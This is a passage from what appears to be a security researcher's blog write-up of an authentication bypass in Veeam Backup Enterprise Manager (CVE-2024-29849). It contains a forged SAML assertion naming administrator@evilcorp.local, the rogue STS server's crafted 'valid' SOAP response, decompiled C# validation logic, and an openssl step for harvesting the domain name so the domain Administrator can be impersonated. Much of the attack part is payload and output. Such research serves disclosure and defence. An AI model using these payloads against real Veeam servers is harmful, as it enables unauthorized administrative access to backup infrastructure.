</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;saml2:Attribute</span> <span style=color:#a6e22e>Name=</span><span style=color:#e6db74>&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;saml2:AttributeValue&gt;</span>John Doe<span style=color:#f92672>&lt;/saml2:AttributeValue&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/saml2:Attribute&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/saml2:AttributeStatement&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/saml2:Assertion&gt;</span>&#34;}
</span></span></code></pre></div><p>Causes the <code>ValidateAuthToken</code> to construct the following SOAP request and send it to our rogue server at <code>https://192.168.253.1/STSService</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;soap:Envelope</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>xmlns:soap=</span><span style=color:#e6db74>&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>xmlns:xsd=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;soap:Header&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;Security</span>
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;Timestamp</span>
</span></span><span style=display:flex><span>				<span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;Created&gt;</span>2024-06-10T02:31:13.148Z<span style=color:#f92672>&lt;/Created&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;Expires&gt;</span>2024-06-10T03:01:13.148Z<span style=color:#f92672>&lt;/Expires&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;/Timestamp&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;/Security&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;/soap:Header&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;soap:Body&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;RequestSecurityToken</span>
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;TokenType&gt;</span>http://docs.oasis-open.org/ws-sx/ws-trust/200512/RSTR/Status<span style=color:#f92672>&lt;/TokenType&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;RequestType&gt;</span>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Validate<span style=color:#f92672>&lt;/RequestType&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;ValidateTarget&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;saml2:Assertion</span>
</span></span><span style=display:flex><span>					<span style=color:#a6e22e>xmlns:saml2=</span><span style=color:#e6db74>&#34;urn:oasis:names:tc:SAML:2.0:assertion&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;saml2:Issuer&gt;</span>https://192.168.253.1:443/STSService<span style=color:#f92672>&lt;/saml2:Issuer&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;saml2:Subject&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;saml2:NameID&gt;</span>administrator@evilcorp.local<span style=color:#f92672>&lt;/saml2:NameID&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;saml2:SubjectConfirmation&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;saml2:SubjectConfirmationData</span> <span style=color:#a6e22e>NotOnOrAfter=</span><span style=color:#e6db74>&#34;2024-06-10T00:00:00Z&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;/saml2:SubjectConfirmation&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;/saml2:Subject&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;saml2:Conditions</span> <span style=color:#a6e22e>NotBefore=</span><span style=color:#e6db74>&#34;2024-06-09T00:00:00Z&#34;</span> <span style=color:#a6e22e>NotOnOrAfter=</span><span style=color:#e6db74>&#34;2024-06-10T00:00:00Z&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;saml2:AudienceRestriction&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;saml2:Audience&gt;</span>https://sp.example.com/SAML2<span style=color:#f92672>&lt;/saml2:Audience&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;/saml2:AudienceRestriction&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;/saml2:Conditions&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;saml2:AuthnStatement</span> <span style=color:#a6e22e>AuthnInstant=</span><span style=color:#e6db74>&#34;2024-06-09T00:00:00Z&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;saml2:AuthnContext&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;saml2:AuthnContextClassRef&gt;</span>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport<span style=color:#f92672>&lt;/saml2:AuthnContextClassRef&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;/saml2:AuthnContext&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;/saml2:AuthnStatement&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;saml2:AttributeStatement&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;saml2:Attribute</span> <span style=color:#a6e22e>Name=</span><span style=color:#e6db74>&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;saml2:AttributeValue&gt;</span>username@example.com<span style=color:#f92672>&lt;/saml2:AttributeValue&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;/saml2:Attribute&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;saml2:Attribute</span> <span style=color:#a6e22e>Name=</span><span style=color:#e6db74>&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;saml2:AttributeValue&gt;</span>John Doe<span style=color:#f92672>&lt;/saml2:AttributeValue&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;/saml2:Attribute&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;/saml2:AttributeStatement&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;/saml2:Assertion&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;/ValidateTarget&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;/RequestSecurityToken&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;/soap:Body&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/soap:Envelope&gt;</span>
</span></span></code></pre></div><p>what is the big deal? well as you can see once this method receives a response from an attacker controlled URL, it will use the response value to decide weather the provided token was valid or not (line 11, 12) and populate the <code>flag</code> variable <code>true</code> if it was valid and <code>false</code> if it wasn&rsquo;t, meaning we can tell &ldquo;Veeam Enterprise Manager&rdquo; to ask our &ldquo;Rogue Server&rdquo; if your provided malicious token is valid or not, well, of course it is.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>bool</span> ValidateAuthToken(XmlElement token)
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  	RequestSecurityTokenResponseType requestSecurityTokenResponseType = <span style=color:#66d9ef>this</span>._service.Validate(<span style=color:#66d9ef>new</span> RequestSecurityTokenType
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  		TokenType = TokenTypeEnum.httpdocsoasisopenorgwssxwstrust200512RSTRStatus,
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  		RequestType = RequestTypeEnum.httpdocsoasisopenorgwssxwstrust200512Validate,
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  		ValidateTarget = token,
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  		TokenTypeSpecified = <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  	});
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  	StatusCodeEnum code = requestSecurityTokenResponseType.Status.Code;
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  	<span style=color:#66d9ef>bool</span> flag;
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  	<span style=color:#66d9ef>if</span> (code != StatusCodeEnum.httpdocsoasisopenorgwssxwstrust200512statusvalid)
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  		<span style=color:#66d9ef>if</span> (code != StatusCodeEnum.httpdocsoasisopenorgwssxwstrust200512statusinvalid)
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>15</span>:  			<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NotImplementedException(<span style=color:#e6db74>&#34;Unknown token validation result status code.&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>16</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span>:  		flag = <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>18</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>19</span>:  	<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span>:  		flag = <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>:  	Log.Message(<span style=color:#e6db74>&#34;Token is {0}. Message: {1}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
</span></span><span style=display:flex><span><span style=color:#ae81ff>24</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span>:  		flag ? <span style=color:#e6db74>&#34;valid.&#34;</span> : <span style=color:#e6db74>&#34;invalid.&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#ae81ff>26</span>:  		requestSecurityTokenResponseType.Status.Reason
</span></span><span style=display:flex><span><span style=color:#ae81ff>27</span>:  	});
</span></span><span style=display:flex><span><span style=color:#ae81ff>28</span>:  	<span style=color:#66d9ef>return</span> flag;
</span></span><span style=display:flex><span><span style=color:#ae81ff>29</span>:  }
</span></span></code></pre></div><p>We just need to take proper care of the malicious response formatting and this is how it looks like</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;?xml version<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.0&#34;</span> encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-16&#34;</span>?&gt;
</span></span><span style=display:flex><span>&lt;soap:Envelope xmlns:soap<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> xmlns:xsd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema&#34;</span> xmlns:xsi<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>&gt;
</span></span><span style=display:flex><span>  &lt;soap:Body&gt;
</span></span><span style=display:flex><span>    &lt;RequestSecurityTokenResponse xmlns<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;</span>&gt;
</span></span><span style=display:flex><span>      &lt;TokenType&gt;urn:oasis:names:tc:SAML:2.0:assertion&lt;/TokenType&gt;
</span></span><span style=display:flex><span>      &lt;Status&gt;
</span></span><span style=display:flex><span>        &lt;Code&gt;http://docs.oasis-open.org/ws-sx/ws-trust/200512/status/valid&lt;/Code&gt;
</span></span><span style=display:flex><span>      &lt;/Status&gt;
</span></span><span style=display:flex><span>    &lt;/RequestSecurityTokenResponse&gt;
</span></span><span style=display:flex><span>  &lt;/soap:Body&gt;
</span></span><span style=display:flex><span>&lt;/soap:Envelope&gt;
</span></span></code></pre></div><p>Moment of truth?</p><p><img src=https://summoning.team/images/blog/veeam-epm/03.png alt=veeam-CVE-2024-29849></p><p>Perfect! the token has been marked as &ldquo;Valid&rdquo;, now lets go back and see what happens with the return value of this method.</p><p>As you can notice quickly now, when the line (3) succeeds meaning the &ldquo;Token&rdquo; has been marked as &ldquo;Valid&rdquo; The <code>ExtractUserInfo</code> is called at line (11)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  <span style=color:#66d9ef>using</span> (CVcAuthService cvcAuthService = CVcAuthService.Open(uri))
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	<span style=color:#66d9ef>if</span> (!cvcAuthService.ValidateAuthToken(documentElement))
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  	{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#e6db74>&#34;Failed to validate Single Sign-On token&#34;</span>);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  	}
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  }
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  <span style=color:#66d9ef>string</span> text;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  SecurityIdentifier securityIdentifier;
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  IdentityReference[] array2;
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  CAuthorizationManager.ExtractUserInfo(documentElement, xmlDocument, xmlNamespaceManager, <span style=color:#66d9ef>out</span> text, <span style=color:#66d9ef>out</span> securityIdentifier, <span style=color:#66d9ef>out</span> array2);
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  cuserSessionContextData = <span style=color:#66d9ef>this</span>.AuthorizeByUserSid(text, securityIdentifier, array2, <span style=color:#66d9ef>true</span>);
</span></span></code></pre></div><p>simply put, this method will again user our provided XML and look for the <code>saml2:NameID</code> element, and after extracting this value AKA principal, it will split its value using a <code>@</code> character and takes the first and second member of the created array and invokes the <code>NTAccount</code> class, for those who are not familiar, the <code>System.Security.Principal.NTAccount</code> expects a <code>username</code> and a <code>domainName</code> and if the user exist it will create a valid principal for it. Since we have full control over the <code>saml2:NameID</code>, we can impersonate anyone we&rsquo;d like, now that, is power!
but that&rsquo;s not all, even when the <code>ntaccount</code> variable is populated, it still has to go through 3 other functions as well:</p><ul><li>TryToSecurityIdentifier</li><li>ExtractGroupsIdentityReferencesFromSsoToken</li><li>FindUserLocalGroups</li></ul><p>and importantly, when the <code>Veeam.Backup.Interaction.Reporting.CEnterpriseExtentions.TryToSecurityIdentifier</code> succeeds, the <code>userSid</code> variable is populated with a valid instance of <code>SecurityIdentifier</code> which is critical to the authentication bypass, this is an actual valid identifier that can be used to say a user is authenticated.</p><p>Now I can bore you with the details of the rest of those functions as well, on how veeam has overrode some of those internal methods and used reflection convert a SID to an actual handle for a principal and all of that, but I&rsquo;ll spare you the details on it and cut to the important part, you see, the only thing that we now need is a username to impersonate, and this username has to be in UPN format, so we also need the &ldquo;domain name&rdquo; of the target server, lets solve that problem quickly</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> ExtractUserInfo(XmlElement token, XmlDocument tokenDoc, XmlNamespaceManager xnsManager, <span style=color:#66d9ef>out</span> <span style=color:#66d9ef>string</span> ntUserAccount, <span style=color:#66d9ef>out</span> SecurityIdentifier userSid, <span style=color:#66d9ef>out</span> IdentityReference[] userGroups)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	XmlNode xmlNode = token.SelectSingleNode(<span style=color:#e6db74>&#34;/saml2:Assertion/saml2:Subject/saml2:NameID&#34;</span>, xnsManager);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (xmlNode == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#e6db74>&#34;Unknown user principal name.&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	Log.SecureMessage(<span style=color:#e6db74>&#34;Single sign-On token user principal name: {0}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { xmlNode.InnerText });
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>string</span>[] array = xmlNode.InnerText.Split(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span>[] { <span style=color:#e6db74>&#39;@&#39;</span> });
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (array.Length != <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;Unknown user principal name: {0}&#34;</span>, xmlNode.InnerText));
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	NTAccount ntaccount = <span style=color:#66d9ef>new</span> NTAccount(array[<span style=color:#ae81ff>1</span>], array[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>	XmlNode xmlNode2 = token.SelectSingleNode(<span style=color:#e6db74>&#34;/saml2:Assertion/saml2:Conditions&#34;</span>, xnsManager);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (xmlNode2 != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		XmlAttribute xmlAttribute = xmlNode2.Attributes[<span style=color:#e6db74>&#34;NotBefore&#34;</span>];
</span></span><span style=display:flex><span>		XmlAttribute xmlAttribute2 = xmlNode2.Attributes[<span style=color:#e6db74>&#34;NotOnOrAfter&#34;</span>];
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (xmlAttribute != <span style=color:#66d9ef>null</span> &amp;&amp; xmlAttribute2 != <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			Log.Message(<span style=color:#e6db74>&#34;Single Sign-On token is valid from {0} to {1}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { xmlAttribute.InnerText, xmlAttribute2.InnerText });
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (!ntaccount.TryToSecurityIdentifier(<span style=color:#66d9ef>out</span> userSid))
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;Cannot resolve user SID: {0}&#34;</span>, xmlNode.InnerText));
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	ntUserAccount = ntaccount.Value;
</span></span><span style=display:flex><span>	List&lt;IdentityReference&gt; list = <span style=color:#66d9ef>new</span> List&lt;IdentityReference&gt;();
</span></span><span style=display:flex><span>	IEnumerable&lt;IdentityReference&gt; enumerable = CAuthorizationManager.ExtractGroupsIdentityReferencesFromSsoToken(tokenDoc, xnsManager);
</span></span><span style=display:flex><span>	list.AddRange(enumerable);
</span></span><span style=display:flex><span>	IEnumerable&lt;IdentityReference&gt; enumerable2 = CAuthorizationManager.FindUserLocalGroups(userSid, enumerable);
</span></span><span style=display:flex><span>	list.AddRange(enumerable2);
</span></span><span style=display:flex><span>	userGroups = list.ToArray();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>For the username, we know the domain &ldquo;Administrator&rdquo; always exist and I thought, how can we get the domain name? well, we can just use the fact that veeam by default creates a self signed certificate and uses the FQDN hostname of the server in the Common Name (CN) part of the certificate, so we can just extract the CN value and use it to have the target username UPN ready for impersonation.</p><pre tabindex=0><code>openssl s_client -connect 192.168.253.180:9398 -showcerts

CONNECTED(00000004)
Can&#39;t use SSL_get_servername
depth=0 CN = batserver.evilcorp.local
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = batserver.evilcorp.local
verify return:1
---
Certificate chain
 0 s:CN = batserver.evilcorp.local
   i:CN = batserver.evilcorp.local
-----BEGIN CERTIFICATE-----
MIIC9zCCAd+gAwIBAgIQGX5JwCx+W4tLeh6aoX292jANBgkqhkiG9w0BAQsFADAj
MSEwHwYDVQQDExhiYXRzZXJ2ZXIuZXZpbGNvcnAubG9jYWwwHhcNMjQwNjA5MjA1
OTAzWhcNMzQwNjA3MjA1OTAzWjAjMSEwHwYDVQQDExhiYXRzZXJ2ZXIuZXZpbGNv
cnAubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDSsXUQqJGO
KmNTED8TSkDxrC55HSZqbLiChrTyLULC6Qfo945qxlRHS+CVcRcVPtv/nuIukDi1
RDVIb1TUW86Nd40AhdwO1CnlZQr+4lx67mup0EHLZduK+52Yh6jIu6PB4Ui1EWZS
Sh/yzWEGmSIowIT+JUPVtsofwvUDW4nOPXeiTHe3rF3lNt/u0X2EXK8ii2eV3qB9
MP7D7tDFkyzgOarOwE+dcYZPE836dpmvvzPVjY2gOBTUbfOuqcHWEYHFnDvr2oRl
0lWmt88+6Of1KMg8khejzhs17chdQBCbVxn1yvcbRhWQqmdZFjJ8k/PNIDMqzkGQ
Uw3n15oKpmcxAgMBAAGjJzAlMCMGA1UdEQQcMBqCGGJhdHNlcnZlci5ldmlsY29y
cC5sb2NhbDANBgkqhkiG9w0BAQsFAAOCAQEAFi8ROU0E+ESgAO8aKT0p95D4dCzC
G6nl46ldvuXHGBVamr+wq6c9a7yZENHJQIk8ftvvJ7OYrI5wvsiXg5nDNhjnsKu7
lQZgfGRybOyiZh8UCMXQM4xkQtF659S5e9sv7c2h/WCEeFvQ2gYWk9O8DwedkuR8
gJRTjjkJZu/wzAifzPZRp1SsjTPio49S8IMMjm1uAJUCDq/LBkmilOKGdrf/JG1s
jKsLPFczSaEeu9qhO6/Od0/ytqYqVpeCmcpC2PDPoyDBqDpF7K0hPLvBvtEg7ptX
XsEpgBhHM1XFiXlqrfpXhotMDW6ZOs/MotDEeh9X3WpW2tgmBpazIrrCRQ==
-----END CERTIFICATE-----
---
Server certificate
subject=CN = batserver.evilcorp.local

issuer=CN = batserver.evilcorp.local
</code></pre><p>and now that this method returns, we need to step back and see how is the return value used, remember all of this? look at line (26) when the <code>ExtractUserInfo</code> succeeds, it populates the <code>out securityIdentifier</code> from within the method and now the line (27) is executed which will use the created <code>securityIdentifier</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>public</span> CUserSessionContextData&lt;CWinLoginDependantInfo&gt; AuthorizeByVMwareSsoToken(<span style=color:#66d9ef>string</span> ssoToken)
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  	Uri uri = <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	CUserSessionContextData&lt;CWinLoginDependantInfo&gt; cuserSessionContextData;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  	<span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  	{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  		<span style=color:#66d9ef>byte</span>[] array = Convert.FromBase64String(ssoToken);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  		<span style=color:#66d9ef>string</span> @string = Encoding.UTF8.GetString(array);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  		XmlDocument xmlDocument = <span style=color:#66d9ef>new</span> XmlDocument();
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  		xmlDocument.LoadXml(@string);
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  		XmlElement documentElement = xmlDocument.DocumentElement;
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  		XmlNamespaceManager xmlNamespaceManager = <span style=color:#66d9ef>new</span> XmlNamespaceManager(xmlDocument.NameTable);
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  		xmlNamespaceManager.AddNamespace(<span style=color:#e6db74>&#34;saml2&#34;</span>, <span style=color:#e6db74>&#34;urn:oasis:names:tc:SAML:2.0:assertion&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  		XmlNode xmlNode = documentElement.SelectSingleNode(<span style=color:#e6db74>&#34;/saml2:Assertion/saml2:Issuer&#34;</span>, xmlNamespaceManager);
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  		uri = <span style=color:#66d9ef>this</span>.FindValidSTSEndpointUrl(xmlNode.InnerText);
</span></span><span style=display:flex><span><span style=color:#ae81ff>15</span>:  		Log.Message(<span style=color:#e6db74>&#34;Validating Single Sign-On token. Service enpoint URL: {0}&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { uri });
</span></span><span style=display:flex><span><span style=color:#ae81ff>16</span>:  		<span style=color:#66d9ef>using</span> (CVcAuthService cvcAuthService = CVcAuthService.Open(uri))
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>18</span>:  			<span style=color:#66d9ef>if</span> (!cvcAuthService.ValidateAuthToken(documentElement))
</span></span><span style=display:flex><span><span style=color:#ae81ff>19</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span>:  				<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#e6db74>&#34;Failed to validate Single Sign-On token&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>:  		<span style=color:#66d9ef>string</span> text;
</span></span><span style=display:flex><span><span style=color:#ae81ff>24</span>:  		SecurityIdentifier securityIdentifier;
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span>:  		IdentityReference[] array2;
</span></span><span style=display:flex><span><span style=color:#ae81ff>26</span>:  		CAuthorizationManager.ExtractUserInfo(documentElement, xmlDocument, xmlNamespaceManager, <span style=color:#66d9ef>out</span> text, <span style=color:#66d9ef>out</span> securityIdentifier, <span style=color:#66d9ef>out</span> array2);
